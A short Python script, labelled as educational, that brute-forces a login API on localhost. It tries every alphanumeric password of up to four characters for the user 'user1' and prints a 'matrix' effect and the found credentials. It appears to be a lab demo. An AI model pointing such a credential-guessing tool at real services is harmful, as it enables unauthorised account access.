#!/usr/bin/env python3
import requests
from itertools import product
import time
import random

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
USUARIO = "user1"
MAX_LEN_PASSWORD = 4

GREEN = "\033[92m"
RESET = "\033[0m"

print(GREEN + r"""
 __        _______ _     ____ ___  __  __ _____   _  __    _    _  _____ _______________
 \ \      / / ____| |   / ___/ _ \|  \/  | ____| | |/ /   / \  | |/ / _ \__  /__  /__  /
  \ \ /\ / /|  _| | |  | |  | | | | |\/| |  _|   | ' /   / _ \ | ' / | | |/ /  / /  / /
   \ V  V / | |___| |__| |__| |_| | |  | | |___  | . \  / ___ \| . \ |_| / /_ / /_ / /_
    \_/\_/  |_____|_____\____\___/|_|  |_|_____| |_|\_\/_/   \_\_|\_\___/____/____/____|
""" + RESET)

print(GREEN + "🔐 Iniciando fuerza bruta educativa sobre la API...\n" + RESET)

INTENTOS = 0
URL = "http://127.0.0.1:8000/login"

def send_request(username, password):
    try:
        response = requests.post(
            URL,
            json={"nombre_usuario": username, "contrasena": password},
            timeout=0.5
        )
        return response.text
    except requests.RequestException:
        return ""

def matrix_effect(text):
    display = ''.join(random.choice(CHARSET) if c != ':' else ':' for c in text)
    print(GREEN + display + RESET, end='\r')

def main():
    global INTENTOS
    for length in range(1, MAX_LEN_PASSWORD + 1):
        for passwd_tuple in product(CHARSET, repeat=length):
            password = ''.join(passwd_tuple)
            INTENTOS += 1
            matrix_effect(f"{USUARIO}:{password}")
            resp = send_request(USUARIO, password)
            if "Login correcto" in resp or "Login exitoso" in resp:
                print(GREEN + f"\n✅ Credenciales válidas encontradas: {USUARIO}:{password}" + RESET)
                print(f"🔢 Total de intentos: {INTENTOS}")
                return
    print("\n❌ Contraseña no encontrada en el rango especificado.")
    print(f"🔢 Total de intentos: {INTENTOS}")

if __name__ == "__main__":
    main()
